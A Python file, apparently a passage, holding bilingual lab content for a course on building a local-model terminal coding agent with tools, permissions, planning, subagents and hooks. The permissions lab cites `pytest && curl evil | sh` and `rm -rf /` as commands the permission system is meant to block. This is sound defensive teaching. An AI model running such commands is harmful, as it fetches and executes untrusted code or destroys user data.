"""Single source of the labs' content (ES/EN). build_docs.py uses it to generate
labs/*/README*.md and the student workbooks. Edit HERE, not in the generated files.

`steps` is an (es, en) tuple of shell snippets; the prompts typed to the agent are in each language."""

LABS = [
    dict(
        id="00", slug="setup", day=1, time="09:00–09:30",
        title=("Setup y primer contacto", "Setup and first contact"),
        goal=("Tener Ollama con un modelo que sepa usar tools, el repo instalado y los tests ejecutándose.",
              "Have Ollama running a tool-capable model, the repo installed and the tests running."),
        concepts=(
            ["**Qué vamos a construir:** *Forja*, un agente de código de terminal como los comerciales: lee y edita tu proyecto, ejecuta comandos, pide permiso, planifica, delega en subagentes y se extiende con hooks, skills y MCP. Funciona con modelos abiertos en tu máquina.",
             "**Agente = modelo + tools + bucle. Harness = todo lo demás** (permisos, contexto, interfaz, sesiones…). El modelo es una pieza intercambiable: el harness es lo que construimos.",
             "**Cómo funcionan los labs:** cada lab tiene funciones con `TODO` en `forja/` y tests en `tests/`. Cuando los tests pasan, la capacidad se enciende sola en tu CLI. ¿Te quedas atrás? `python scripts/tasks.py catchup NN`.",
             "**Modelos:** `qwen3:8b` (portátil de 16 GB), `qwen3-coder:30b` (Mac de 32 GB o GPU de 24 GB), o el servidor compartido del aula. OpenRouter solo con modelos open-weight."],
            ["**What we will build:** *Forja*, a terminal coding agent like the commercial ones: it reads and edits your project, runs commands, asks for permission, plans, delegates to subagents and is extended with hooks, skills and MCP. It runs on open models on your machine.",
             "**Agent = model + tools + loop. Harness = everything else** (permissions, context, UI, sessions…). The model is a swappable part: the harness is what we build.",
             "**How the labs work:** each lab has `TODO` functions in `forja/` and tests in `tests/`. When the tests pass, the capability lights up in your CLI. Falling behind? `python scripts/tasks.py catchup NN`.",
             "**Models:** `qwen3:8b` (16 GB laptop), `qwen3-coder:30b` (32 GB Mac or 24 GB GPU), or the room's shared server. OpenRouter with open-weight models only."]),
        todos=[],
        steps=("""python -m venv .venv
.venv\\Scripts\\activate            # Windows   (Linux/macOS: source .venv/bin/activate)
python scripts/tasks.py setup      # instala y crea .env
ollama pull qwen3:8b               # o el modelo de tu nivel de hardware
python scripts/tasks.py test       # casi todo en rojo: es lo esperado
cd playground && python -m pytest -q   # 3 tests fallan: trabajo para tu agente""",
               """python -m venv .venv
.venv\\Scripts\\activate            # Windows   (Linux/macOS: source .venv/bin/activate)
python scripts/tasks.py setup      # installs and creates .env
ollama pull qwen3:8b               # or the model for your hardware tier
python scripts/tasks.py test       # almost everything red: that's expected
cd playground && python -m pytest -q   # 3 tests fail: work for your agent"""),
        checkpoint=("`ollama run qwen3:8b \"hola\"` responde y `python scripts/tasks.py test` se ejecuta (en rojo, como debe ser). El tutor enseña `python scripts/tasks.py demo`: así será tu agente al final del día 2.",
                    "`ollama run qwen3:8b \"hello\"` answers and `python scripts/tasks.py test` runs (red, as it should). The tutor shows `python scripts/tasks.py demo`: that is what your agent will look like at the end of day 2."),
        challenges=(["Ejecuta `ollama ps` mientras el modelo responde: ¿va en GPU o CPU? ¿Cuánta memoria usa?",
                     "Lee `forja/harness.py` por encima: localiza la «puerta» por la que pasa cada tool call."],
                    ["Run `ollama ps` while the model answers: GPU or CPU? How much memory?",
                     "Skim `forja/harness.py`: find the “gate” every tool call goes through."]),
        test=None,
    ),
    dict(
        id="01", slug="llm_streaming", day=1, time="09:30–10:15",
        title=("Cliente LLM con streaming", "Streaming LLM client"),
        goal=("Hablar con cualquier backend OpenAI-compatible en streaming y reconstruir las tool calls que llegan troceadas.",
              "Talk to any OpenAI-compatible backend in streaming mode and rebuild tool calls that arrive in pieces."),
        concepts=(
            ["**Un protocolo, muchos backends:** Ollama, vLLM, LM Studio, llama.cpp y OpenRouter hablan Chat Completions. El SDK `openai` es solo un cliente HTTP; el modelo es abierto.",
             "**Streaming:** el texto llega token a token (la CLI se siente viva). Las **tool calls también llegan troceadas**: `index`, luego `id` y `name`, luego el JSON de argumentos en pedazos, a veces de varias llamadas intercaladas.",
             "**Rarezas de modelos locales:** bloques `<think>…</think>` que pueden partirse entre chunks; tool calls escritas como texto `<tool_call>{…}</tool_call>`.",
             "**Reintentos:** solo errores transitorios (conexión, 429, 5xx) con backoff exponencial. Un 400 no se arregla reintentando."],
            ["**One protocol, many backends:** Ollama, vLLM, LM Studio, llama.cpp and OpenRouter all speak Chat Completions. The `openai` SDK is just an HTTP client; the model is open.",
             "**Streaming:** text arrives token by token (the CLI feels alive). **Tool calls arrive in pieces too**: `index`, then `id` and `name`, then the argument JSON in fragments, sometimes interleaved across calls.",
             "**Local-model quirks:** `<think>…</think>` blocks that may be split across chunks; tool calls written as text `<tool_call>{…}</tool_call>`.",
             "**Retries:** only transient errors (connection, 429, 5xx) with exponential backoff. A 400 isn't fixed by retrying."]),
        todos=[("01.1", "llm.py", "ToolCallAccumulator: concatenar fragmentos por índice", "ToolCallAccumulator: concatenate fragments by index"),
               ("01.2", "llm.py", "ThinkFilter: quitar <think> aunque la etiqueta llegue partida", "ThinkFilter: strip <think> even when the tag is split"),
               ("01.3", "llm.py", "LLMClient.stream: reintentos, eventos TextDelta y Done", "LLMClient.stream: retries, TextDelta and Done events")],
        steps=("""python scripts/tasks.py test 01
forja doctor                      # ¿el modelo llama tools?
forja                             # ya es un chat en streaming (aún sin tools)""",
               """python scripts/tasks.py test 01
forja doctor                      # does the model call tools?
forja                             # already a streaming chat (no tools yet)"""),
        checkpoint=("`forja doctor` dice ✔ y `forja` responde en streaming. Aparecen avisos «lab NN pending»: es normal.",
                    "`forja doctor` shows ✔ and `forja` answers in streaming. “lab NN pending” notes are expected."),
        challenges=(["Mide el *time-to-first-token* local frente a OpenRouter.", "¿Qué pasa si el modelo emite dos tool calls con el mismo `index`? ¿Puede ocurrir?"],
                    ["Measure local time-to-first-token against OpenRouter.", "What if the model emits two tool calls with the same `index`? Can it happen?"]),
        test="test_l01_llm.py",
    ),
    dict(
        id="02", slug="file_tools", day=1, time="10:15–11:15",
        title=("Tools de ficheros", "File tools"),
        goal=("Dar al agente ojos y manos sobre el proyecto: leer, buscar, crear y editar ficheros con seguridad.",
              "Give the agent eyes and hands on the project: read, search, create and edit files safely."),
        concepts=(
            ["**El schema es el prompt:** nombre, docstring y type hints generan el JSON Schema que lee el modelo. Una buena descripción vale más que cualquier instrucción en el system prompt.",
             "**Las tools nunca lanzan:** cualquier error vuelve al modelo como texto accionable (\"aparece 3 veces: añade contexto\") para que se corrija solo.",
             "**edit_file = sustitución exacta de un texto único.** Es el formato más robusto con modelos pequeños (los diffs los generan mal). Errores frecuentes del modelo: incluir los números de línea de `read_file` o cambiar la indentación.",
             "**Leer antes de editar** y detectar cambios externos (mtime): el agente no pisa lo que no ha visto ni lo que tú has cambiado.",
             "**Sandbox:** todas las rutas se resuelven dentro del workspace. `../` y rutas absolutas fuera, rechazadas.",
             "**Explorar sin cargar el repo:** `grep` y `glob` devuelven rutas y líneas; el agente solo lee lo relevante."],
            ["**The schema is the prompt:** name, docstring and type hints generate the JSON Schema the model reads. A good description beats any system-prompt instruction.",
             "**Tools never raise:** every error goes back to the model as actionable text (“appears 3 times: add context”) so it can self-correct.",
             "**edit_file = exact replacement of a unique string.** The most robust format for small models (they produce bad diffs). Typical model mistakes: including `read_file` line numbers or changing indentation.",
             "**Read before edit** and detect external changes (mtime): the agent doesn't overwrite what it hasn't seen or what you just changed.",
             "**Sandbox:** every path resolves inside the workspace. `../` and outside absolute paths are rejected.",
             "**Explore without loading the repo:** `grep` and `glob` return paths and lines; the agent reads only what's relevant."]),
        todos=[("02.1", "tools.py", "Tool.schema: JSON Schema en formato OpenAI", "Tool.schema: OpenAI-format JSON Schema"),
               ("02.2", "tools.py", "ToolRegistry.execute: ejecutar sin lanzar nunca", "ToolRegistry.execute: run without ever raising"),
               ("02.3", "fs_tools.py", "Workspace.resolve: sandbox de rutas", "Workspace.resolve: path sandbox"),
               ("02.4", "fs_tools.py", "write_file: crear / reescribir con «leer antes»", "write_file: create / overwrite with read-first"),
               ("02.5", "fs_tools.py", "edit_file: sustitución exacta y única con errores útiles", "edit_file: exact, unique replacement with useful errors"),
               ("02.6", "fs_tools.py", "grep: búsqueda por regex en el workspace", "grep: regex search across the workspace")],
        steps=("""python scripts/tasks.py test 02
forja --cwd playground
> ¿qué hace la función due_date?        (aún sin bucle: responde como un chat; las tools llegan en el lab 03)""",
               """python scripts/tasks.py test 02
forja --cwd playground
> what does the due_date function do?        (no loop yet: it answers as a chat; tools arrive in lab 03)"""),
        checkpoint=("Tests del lab 02 en verde. Con el lab 03 todavía pendiente, Forja sigue siendo un chat: el bucle llega a continuación.",
                    "Lab 02 tests green. With lab 03 still pending, Forja is still a chat: the loop comes next."),
        challenges=(["Añade una tool `list_dir` con árbol de 2 niveles. ¿Mejora o empeora la exploración del modelo?",
                     "Pide al modelo que edite algo y fíjate en sus errores de `old_string`: ¿qué pista añadirías al mensaje de error?"],
                    ["Add a `list_dir` tool with a 2-level tree. Does it help or hurt the model's exploration?",
                     "Ask the model to edit something and watch its `old_string` mistakes: which hint would you add to the error message?"]),
        test="test_l02_tools.py",
    ),
    dict(
        id="03", slug="loop", day=1, time="11:30–12:15",
        title=("El bucle del agente", "The agent loop"),
        goal=("Escribir el bucle que convierte un modelo en un agente: pensar → actuar → observar, hasta terminar.",
              "Write the loop that turns a model into an agent: think → act → observe, until done."),
        concepts=(
            ["**Diez líneas:** pedir respuesta con tools → si no pide tools, fin → ejecutar → añadir resultados → repetir. Todo framework de agentes es esto con más capas.",
             "**El historial es el estado:** cada `assistant` con `tool_calls` va seguido de un mensaje `tool` por cada `tool_call_id`. Romper ese par = error 400 en casi cualquier backend.",
             "**Lecturas en paralelo, escrituras en orden:** varias `read_file`/`grep` a la vez se ejecutan en paralelo; una edición y un `pytest` nunca.",
             "**Paradas explícitas:** respuesta final, máximo de pasos, bucle detectado (misma tool + mismos argumentos) e interrupción del usuario (Ctrl+C).",
             "**El bucle no sabe de permisos ni de interfaz:** recibe una función `execute` (la puerta del harness) y unos `events`. Por eso lo reutilizamos para subagentes y evals."],
            ["**Ten lines:** ask for a response with tools → if no tools requested, done → execute → append results → repeat. Every agent framework is this with more layers.",
             "**History is the state:** each `assistant` with `tool_calls` is followed by one `tool` message per `tool_call_id`. Breaking the pair = HTTP 400 on almost any backend.",
             "**Parallel reads, ordered writes:** several `read_file`/`grep` calls run in parallel; an edit and a `pytest` never do.",
             "**Explicit stops:** final answer, max steps, loop detected (same tool + same args) and user interrupt (Ctrl+C).",
             "**The loop knows nothing about permissions or UI:** it gets an `execute` function (the harness gate) and `events`. That's why we reuse it for subagents and evals."]),
        todos=[("03.1", "agent.py", "_run_calls: lecturas consecutivas en paralelo, orden preservado", "_run_calls: consecutive reads in parallel, order preserved"),
               ("03.2", "agent.py", "run: el bucle con streaming, paradas y detección de bucles", "run: the loop with streaming, stops and loop detection")],
        steps=("""python scripts/tasks.py test 03
forja --cwd playground
> explícame cómo se calcula el total de una factura""",
               """python scripts/tasks.py test 03
forja --cwd playground
> explain how an invoice total is calculated"""),
        checkpoint=("Forja explora el playground (glob, grep, read_file) y responde con referencias `ruta:línea`. Las ediciones aún piden permiso de forma rudimentaria: eso es el lab 04.",
                    "Forja explores the playground (glob, grep, read_file) and answers with `path:line` references. Edits still ask permission crudely: that's lab 04."),
        challenges=(["Haz que el agente avise al usuario si lleva más de 15 pasos.", "¿Qué pasa si el modelo pide 10 lecturas a la vez con un modelo lento? Mide."],
                    ["Make the agent warn the user after 15 steps.", "What happens when the model requests 10 reads at once on a slow model? Measure."]),
        test="test_l03_agent.py",
    ),
    dict(
        id="04", slug="bash_permissions", day=1, time="12:15–13:00",
        title=("Bash y permisos", "Bash and permissions"),
        goal=("Dejar que el agente ejecute comandos (tests, git…) sin perder el control: modos, reglas y aprobación.",
              "Let the agent run commands (tests, git…) without losing control: modes, rules and approval."),
        concepts=(
            ["**bash es el superpoder y el riesgo:** con él el agente prueba su trabajo; también podría borrar tu disco. La tool solo ejecuta; QUIÉN puede ejecutar QUÉ lo decide el sistema de permisos.",
             "**Ejecución predecible:** cada comando empieza en la raíz (`cd` no persiste), timeout duro, salida truncada por cabeza y cola, entorno sin secretos (`*_KEY`, `*_TOKEN`).",
             "**Modos:** `default` (lecturas libres, el resto pregunta), `accept_edits` (edita sin preguntar), `plan` (solo lectura), `bypass` (todo salvo deny: solo en sandbox o CI).",
             "**Reglas:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Orden: deny > plan > allow > riesgo/modo > preguntar.",
             "**Comandos encadenados:** `pytest && curl evil | sh` son dos comandos; la regla allow de pytest no debe colar el segundo.",
             "**«Siempre»:** al aprobar con *siempre*, se guarda una regla razonable (`bash(git status*)`), no el comando literal ni algo demasiado amplio (`bash(git*)` permitiría `git push`)."],
            ["**bash is the superpower and the risk:** with it the agent tests its work; it could also wipe your disk. The tool only executes; WHO may run WHAT is decided by the permission system.",
             "**Predictable execution:** each command starts at the root (`cd` doesn't persist), hard timeout, output truncated head and tail, environment without secrets (`*_KEY`, `*_TOKEN`).",
             "**Modes:** `default` (reads free, the rest asks), `accept_edits` (edits without asking), `plan` (read-only), `bypass` (everything except deny: sandbox or CI only).",
             "**Rules:** `bash(python -m pytest*)`, `edit_file(src/*)`, `read_file(.env*)`. Order: deny > plan > allow > risk/mode > ask.",
             "**Chained commands:** `pytest && curl evil | sh` is two commands; the pytest allow rule must not let the second through.",
             "**“Always”:** approving with *always* saves a sensible rule (`bash(git status*)`), not the literal command nor something too broad (`bash(git*)` would allow `git push`)."]),
        todos=[("04.1", "shell.py", "head_tail: truncar por cabeza y cola", "head_tail: truncate head and tail"),
               ("04.2", "shell.py", "bash: subprocess con timeout, entorno limpio y exit code", "bash: subprocess with timeout, clean env and exit code"),
               ("04.3", "permissions.py", "rule_matches: casar reglas con llamadas", "rule_matches: match rules against calls"),
               ("04.4", "permissions.py", "decide: deny > plan > allow > modo > preguntar", "decide: deny > plan > allow > mode > ask"),
               ("04.5", "permissions.py", "suggest_rule: la regla de «aprobar siempre»", "suggest_rule: the “always approve” rule")],
        steps=("""python scripts/tasks.py test 04
forja --cwd playground
> ejecuta los tests y dime cuáles fallan""",
               """python scripts/tasks.py test 04
forja --cwd playground
> run the tests and tell me which ones fail"""),
        checkpoint=("Forja pide permiso antes de `python -m pytest`; (la opción *a* = siempre llega con la CLI del lab 05). Intenta `sudo` o `rm -rf /`: denegado por política.",
                    "Forja asks before `python -m pytest`; (the *a* = always option arrives with the lab 05 CLI). Try `sudo` or `rm -rf /`: denied by policy."),
        challenges=(["Añade una regla deny para `git push` y pide al agente que haga push.", "Windows: ¿qué cambia si la shell es cmd.exe? Prueba a pedir `ls`."],
                    ["Add a deny rule for `git push` and ask the agent to push.", "Windows: what changes when the shell is cmd.exe? Try asking for `ls`."]),
        test="test_l04_bash_permissions.py",
    ),
    dict(
        id="05", slug="cli", day=1, time="14:00–15:00",
        title=("La CLI: tu agente de terminal", "The CLI: your terminal agent"),
        goal=("Convertir el harness en una herramienta agradable: streaming, resumen de acciones, diffs, aprobaciones y comandos slash.",
              "Turn the harness into a pleasant tool: streaming, action summaries, diffs, approvals and slash commands."),
        concepts=(
            ["**La experiencia es parte del producto:** el usuario tiene que ver QUÉ hace el agente (una línea por tool), CÓMO cambia el código (diff) y poder pararlo (Ctrl+C) o corregirlo.",
             "**Aprobaciones claras:** qué se va a ejecutar, por qué se pregunta (motivo de la decisión) y tres respuestas: `y` (sí), `n` (no), `a` (siempre).",
             "**Comandos slash:** `/mode`, `/tools`, `/todos`, `/context`, `/compact`, `/cost`, `/undo`, `/sessions`, `/clear`. Operan sobre el harness sin pasar por el modelo.",
             "**Headless:** `forja -p \"…\"` ejecuta y sale: scripts, CI y evals (lab 12). Sin usuario, lo que pide permiso se deniega."],
            ["**Experience is part of the product:** the user must see WHAT the agent does (one line per tool), HOW the code changes (diff) and be able to stop it (Ctrl+C) or correct it.",
             "**Clear approvals:** what will run, why it's being asked (decision reason) and three answers: `y` (yes), `n` (no), `a` (always).",
             "**Slash commands:** `/mode`, `/tools`, `/todos`, `/context`, `/compact`, `/cost`, `/undo`, `/sessions`, `/clear`. They act on the harness without going through the model.",
             "**Headless:** `forja -p \"…\"` runs and exits: scripts, CI and evals (lab 12). With no user, anything needing approval is denied."]),
        todos=[("05.1", "cli.py", "summarize_call: una línea legible por tool call", "summarize_call: one readable line per tool call"),
               ("05.2", "cli.py", "diff_styles: colorear el diff", "diff_styles: colour the diff"),
               ("05.3", "cli.py", "ask_approval: y / n / a (sí / no / siempre)", "ask_approval: y / n / a (yes / no / always)"),
               ("05.4", "cli.py", "handle_slash: comandos slash", "handle_slash: slash commands")],
        steps=("""python scripts/tasks.py test 05
forja --cwd playground --mode accept_edits
> arregla el bug del redondeo de importes y comprueba con los tests
/tools
/cost""",
               """python scripts/tasks.py test 05
forja --cwd playground --mode accept_edits
> fix the amount rounding bug and check with the tests
/tools
/cost"""),
        checkpoint=("**Hito del día 1** (15:15): Forja arregla los 3 tests que fallan en `playground/` con tu modelo local. Compara con el compañero que usa otro modelo.",
                    "**Day 1 milestone** (15:15): Forja fixes the 3 failing tests in `playground/` with your local model. Compare with a neighbour using another model."),
        challenges=(["Añade `/model <nombre>` para cambiar de modelo en caliente.", "Muestra en el prompt de la REPL el % de contexto usado."],
                    ["Add `/model <name>` to switch models on the fly.", "Show the % of context used in the REPL prompt."]),
        test="test_l05_cli.py",
    ),
    dict(
        id="06", slug="context", day=2, time="09:00–09:40",
        title=("Ingeniería de contexto", "Context engineering"),
        goal=("Decidir qué ve el modelo en cada turno: prompt por capas, AGENTS.md, entorno y menciones @fichero.",
              "Decide what the model sees each turn: layered prompt, AGENTS.md, environment and @file mentions."),
        concepts=(
            ["**El system prompt se reconstruye cada turno** por capas: base del agente, recordatorio del modo, instrucciones del proyecto, skills, lista de tareas y entorno (git, SO, fecha, modelo).",
             "**AGENTS.md:** convención abierta para instrucciones de proyecto que leen varias herramientas. Global del usuario + desde la carpeta más alta hasta la actual: lo más específico, al final.",
             "**Entorno = verdad barata:** rama y cambios de git, directorio, fecha. Evita que el modelo adivine.",
             "**@menciones:** `@src/app.py` mete el fichero en el mensaje (y cuenta como leído). Ahorra una vuelta del bucle.",
             "**Menos es más con modelos locales:** cada token de prompt compite con el código. Instrucciones cortas y concretas."],
            ["**The system prompt is rebuilt every turn** in layers: agent base, mode reminder, project instructions, skills, todo list and environment (git, OS, date, model).",
             "**AGENTS.md:** an open convention for project instructions read by several tools. User global + from the highest folder down to the current one: most specific last.",
             "**Environment = cheap truth:** git branch and changes, directory, date. Stops the model guessing.",
             "**@mentions:** `@src/app.py` puts the file in the message (and marks it read). Saves a loop iteration.",
             "**Less is more with local models:** every prompt token competes with code. Short, concrete instructions."]),
        todos=[("06.1", "context.py", "find_instruction_files: AGENTS.md del usuario y de la jerarquía", "find_instruction_files: user and hierarchy AGENTS.md"),
               ("06.2", "context.py", "build_system_prompt: capas en orden", "build_system_prompt: layers in order"),
               ("06.3", "context.py", "expand_mentions: @ruta → contenido", "expand_mentions: @path → content")],
        steps=("""python scripts/tasks.py test 06
forja --cwd playground
> revisa @invoices/amounts.py y dime si cumple lo que dice AGENTS.md""",
               """python scripts/tasks.py test 06
forja --cwd playground
> review @invoices/amounts.py and tell me whether it follows AGENTS.md"""),
        checkpoint=("El agente cita reglas del `playground/AGENTS.md` (half-up, no tocar tests) sin que se las digas.",
                    "The agent quotes `playground/AGENTS.md` rules (half-up, don't touch tests) without being told."),
        challenges=(["Escribe tu `~/.forja/AGENTS.md` con tus preferencias (idioma, estilo).", "Añade al entorno la versión de Python y los últimos 3 commits."],
                    ["Write your `~/.forja/AGENTS.md` with your preferences (language, style).", "Add the Python version and last 3 commits to the environment."]),
        test="test_l06_context.py",
    ),
    dict(
        id="07", slug="compaction", day=2, time="09:40–10:25",
        title=("Gestión de contexto y compactación", "Context management and compaction"),
        goal=("Que una sesión larga quepa en la ventana de un modelo local sin romper el historial.",
              "Make a long session fit a local model's window without breaking history."),
        concepts=(
            ["**El presupuesto:** modelos locales trabajan con 16–32k tokens efectivos. Un `pytest` verboso o un fichero grande se comen la ventana.",
             "**Nivel 1 — microcompactación (gratis):** vaciar salidas de tools antiguas. El modelo ya las usó; si las necesita, vuelve a leer.",
             "**Nivel 2 — compactación (1 llamada):** resumir los turnos antiguos (objetivo, ficheros, comandos, decisiones, pendientes) y conservar los recientes.",
             "**Invariante:** solo se corta antes de un mensaje `user`. Nunca entre un `tool_calls` y sus `tool`.",
             "**Es con pérdida:** mídelo con evals (lab 12) usando una ventana pequeña."],
            ["**The budget:** local models work with 16–32k effective tokens. A verbose `pytest` or a large file eats the window.",
             "**Level 1 — microcompaction (free):** blank old tool outputs. The model already used them; it can re-read if needed.",
             "**Level 2 — compaction (1 call):** summarise old turns (goal, files, commands, decisions, pending) and keep recent ones.",
             "**Invariant:** cut only before a `user` message. Never between `tool_calls` and their `tool` results.",
             "**It's lossy:** measure it with evals (lab 12) using a small window."]),
        todos=[("07.1", "compaction.py", "microcompact: vaciar salidas antiguas", "microcompact: blank old outputs"),
               ("07.2", "compaction.py", "compact: resumen + turnos recientes, sin romper pares", "compact: summary + recent turns, pairs intact")],
        steps=("""python scripts/tasks.py test 07
forja --cwd playground
> lee todos los ficheros del proyecto y resúmelos
/context
/compact
/context""",
               """python scripts/tasks.py test 07
forja --cwd playground
> read every file in the project and summarise them
/context
/compact
/context"""),
        checkpoint=("`/context` baja tras `/compact` y el agente sigue sabiendo qué estaba haciendo.",
                    "`/context` drops after `/compact` and the agent still knows what it was doing."),
        challenges=(["Pon `\"contextWindow\": 6000` en `.forja/settings.json` y trabaja: ¿cuándo compacta?", "Compacta con un modelo más pequeño que el principal."],
                    ["Set `\"contextWindow\": 6000` in `.forja/settings.json` and work: when does it compact?", "Compact with a smaller model than the main one."]),
        test="test_l07_compaction.py",
    ),
    dict(
        id="08", slug="planning", day=2, time="10:25–11:10",
        title=("Planificar antes de actuar", "Plan before acting"),
        goal=("Lista de tareas visible y modo plan: el agente investiga, propone y solo ejecuta cuando apruebas.",
              "Visible task list and plan mode: the agent investigates, proposes and only executes once you approve."),
        concepts=(
            ["**todo_write:** el agente mantiene su lista (pending / in_progress / completed). Obliga a descomponer y mejora mucho la constancia de modelos pequeños en tareas largas. Una sola tarea en curso.",
             "**La lista vuelve al contexto** cada turno (capa del system prompt): el agente no se pierde.",
             "**Modo plan:** solo lectura por permisos, no por buena voluntad del modelo. Cuando tiene un plan, llama a `exit_plan_mode`; si lo apruebas, el harness cambia a modo default.",
             "**Cuándo usarlo:** cambios de varios ficheros, código que no conoces, cualquier cosa difícil de deshacer."],
            ["**todo_write:** the agent keeps its own list (pending / in_progress / completed). It forces decomposition and greatly improves small models' persistence on long tasks. One task in progress.",
             "**The list goes back into context** every turn (a system-prompt layer): the agent doesn't get lost.",
             "**Plan mode:** read-only via permissions, not via the model's goodwill. When it has a plan, it calls `exit_plan_mode`; if you approve, the harness switches to default mode.",
             "**When to use it:** multi-file changes, unfamiliar code, anything hard to undo."]),
        todos=[("08.1", "planning.py", "todo_write con validación", "todo_write with validation"),
               ("08.2", "planning.py", "exit_plan_mode con aprobación del usuario", "exit_plan_mode with user approval")],
        steps=("""python scripts/tasks.py test 08
forja --cwd playground --mode plan
> añade descuentos porcentuales a las facturas (antes del IVA) con tests
/todos""",
               """python scripts/tasks.py test 08
forja --cwd playground --mode plan
> add percentage discounts to invoices (before VAT) with tests
/todos"""),
        checkpoint=("En modo plan el agente investiga, presenta un plan y, al aprobarlo, lo ejecuta marcando tareas.",
                    "In plan mode the agent investigates, presents a plan and, once approved, executes it ticking off tasks."),
        challenges=(["Al aprobar, pasa a `accept_edits` en vez de `default`. ¿Cuándo es buena idea?", "Muestra la lista de tareas en vivo bajo cada respuesta."],
                    ["On approval switch to `accept_edits` instead of `default`. When is that a good idea?", "Show the task list live under each answer."]),
        test="test_l08_planning.py",
    ),
    dict(
        id="09", slug="subagents", day=2, time="11:25–12:10",
        title=("Subagentes", "Subagents"),
        goal=("Delegar exploraciones y revisiones en agentes con contexto propio y tools restringidas.",
              "Delegate exploration and reviews to agents with their own context and restricted tools."),
        concepts=(
            ["**El problema:** explorar un repo cuesta 20 lecturas y 30k tokens que se quedan en el contexto del agente principal para siempre.",
             "**La solución:** la tool `task` lanza un subagente con contexto LIMPIO (system + prompt) que devuelve solo la conclusión. El principal paga ~300 tokens.",
             "**Mismo bucle, otras tools:** reutilizamos `Agent` del lab 03 con un subconjunto de tools y la MISMA puerta de permisos. Un subagente no lanza subagentes.",
             "**Perfiles en Markdown:** `.forja/agents/reviewer.md` con frontmatter (name, description, tools). La descripción es lo que lee el modelo para decidir cuándo delegar.",
             "**El prompt del subagente debe ser autocontenido:** no ve la conversación."],
            ["**The problem:** exploring a repo costs 20 reads and 30k tokens that stay in the main agent's context forever.",
             "**The solution:** the `task` tool launches a subagent with a CLEAN context (system + prompt) that returns only its conclusion. The main agent pays ~300 tokens.",
             "**Same loop, other tools:** we reuse lab 03's `Agent` with a subset of tools and the SAME permission gate. A subagent can't spawn subagents.",
             "**Profiles in Markdown:** `.forja/agents/reviewer.md` with frontmatter (name, description, tools). The description is what the model reads to decide when to delegate.",
             "**The subagent prompt must be self-contained:** it doesn't see the conversation."]),
        todos=[("09.1", "subagents.py", "load_profiles: perfiles desde Markdown", "load_profiles: profiles from Markdown"),
               ("09.2", "subagents.py", "task: lanzar un subagente con contexto limpio", "task: launch a subagent with a clean context")],
        steps=("""python scripts/tasks.py test 09
cp -r examples/project/.forja playground/      # Windows: xcopy /E /I examples\\project\\.forja playground\\.forja
forja --cwd playground
> usa un subagente para averiguar todos los sitios donde se redondea
> pide al subagente reviewer que revise mis cambios sin commitear""",
               """python scripts/tasks.py test 09
cp -r examples/project/.forja playground/      # Windows: xcopy /E /I examples\\project\\.forja playground\\.forja
forja --cwd playground
> use a subagent to find every place where amounts are rounded
> ask the reviewer subagent to review my uncommitted changes"""),
        checkpoint=("Ves las tool calls del subagente con prefijo `[explore]` y el contexto del principal apenas crece (`/context`).",
                    "You see the subagent's tool calls prefixed `[explore]` and the main context barely grows (`/context`)."),
        challenges=(["Crea un subagente `tester` que solo pueda ejecutar `python -m pytest*`.", "Ejecuta el subagente con un modelo más pequeño y rápido."],
                    ["Create a `tester` subagent that can only run `python -m pytest*`.", "Run the subagent on a smaller, faster model."]),
        test="test_l09_subagents.py",
    ),
    dict(
        id="10", slug="extensions", day=2, time="12:10–13:20",
        title=("Extensibilidad: hooks, skills y MCP", "Extensibility: hooks, skills and MCP"),
        goal=("Que el equipo extienda el agente sin tocar su código: política determinista, conocimiento bajo demanda y herramientas externas.",
              "Let the team extend the agent without touching its code: deterministic policy, on-demand knowledge and external tools."),
        concepts=(
            ["**Hooks = garantías:** AGENTS.md *pide*, un hook *impide*. Comandos de shell en `settings.json` que reciben el evento como JSON por stdin. Exit 2 bloquea; exit 0 sigue. Es la convención que usan los agentes comerciales: lo que aprendáis aquí os sirve allí.",
             "**Eventos:** `PreToolUse` (bloquear), `PostToolUse` (feedback, p. ej. linter), `UserPromptSubmit` (filtrar o añadir contexto), `Stop` (no terminar hasta que pasen los tests).",
             "**Skills = divulgación progresiva:** en el prompt solo va el catálogo (nombre + descripción); el cuerpo se carga con la tool `skill` cuando hace falta. Formato portable `SKILL.md`.",
             "**MCP:** servidores que exponen tools (issues, BD, wiki, CI). Forja los arranca desde `settings.json` y los registra como `mcp__servidor__tool`, con riesgo `exec`: pasan por permisos."],
            ["**Hooks = guarantees:** AGENTS.md *asks*, a hook *enforces*. Shell commands in `settings.json` that receive the event as JSON on stdin. Exit 2 blocks; exit 0 continues. It's the convention commercial agents use: what you learn here applies there.",
             "**Events:** `PreToolUse` (block), `PostToolUse` (feedback, e.g. a linter), `UserPromptSubmit` (filter or add context), `Stop` (don't finish until tests pass).",
             "**Skills = progressive disclosure:** only the catalogue (name + description) goes in the prompt; the body is loaded with the `skill` tool when needed. Portable `SKILL.md` format.",
             "**MCP:** servers that expose tools (issues, DB, wiki, CI). Forja starts them from `settings.json` and registers them as `mcp__server__tool`, with `exec` risk: they go through permissions."]),
        todos=[("10.1", "hooks.py", "matching: hooks por evento y matcher", "matching: hooks by event and matcher"),
               ("10.2", "hooks.py", "run: ejecutar y traducir códigos de salida", "run: execute and map exit codes"),
               ("10.3", "skills.py", "discover_skills: catálogo de SKILL.md", "discover_skills: SKILL.md catalogue"),
               ("10.4", "skills.py", "skill: cargar el cuerpo bajo demanda", "skill: load the body on demand"),
               ("10.5", "mcp_tools.py", "mcp_tool_name: espacio de nombres mcp__server__tool", "mcp_tool_name: mcp__server__tool namespace")],
        steps=("""python scripts/tasks.py test 10
cp -r examples/project/.forja playground/      # si no lo hiciste en el lab 09
forja --cwd playground
> lista las issues abiertas, arregla la #12 y comenta en la issue qué cambiaste
> haz commit siguiendo la convención del repo""",
               """python scripts/tasks.py test 10
cp -r examples/project/.forja playground/      # if you didn't in lab 09
forja --cwd playground
> list the open issues, fix #12 and comment on the issue what you changed
> commit following the repo's convention"""),
        checkpoint=("El hook Stop no deja terminar con tests en rojo; el agente carga la skill `conventional-commits` antes de hacer commit; las tools `mcp__issues__*` aparecen en `/tools`.",
                    "The Stop hook won't let it finish with red tests; the agent loads the `conventional-commits` skill before committing; `mcp__issues__*` tools show up in `/tools`."),
        challenges=(["Hook PostToolUse que ejecute `ruff` sobre el fichero editado.", "Conecta un servidor MCP real de tu equipo."],
                    ["A PostToolUse hook that runs `ruff` on the edited file.", "Connect a real MCP server from your team."]),
        test="test_l10_extensions.py",
    ),
    dict(
        id="11", slug="sessions", day=2, time="14:20–14:55",
        title=("Sesiones y deshacer", "Sessions and undo"),
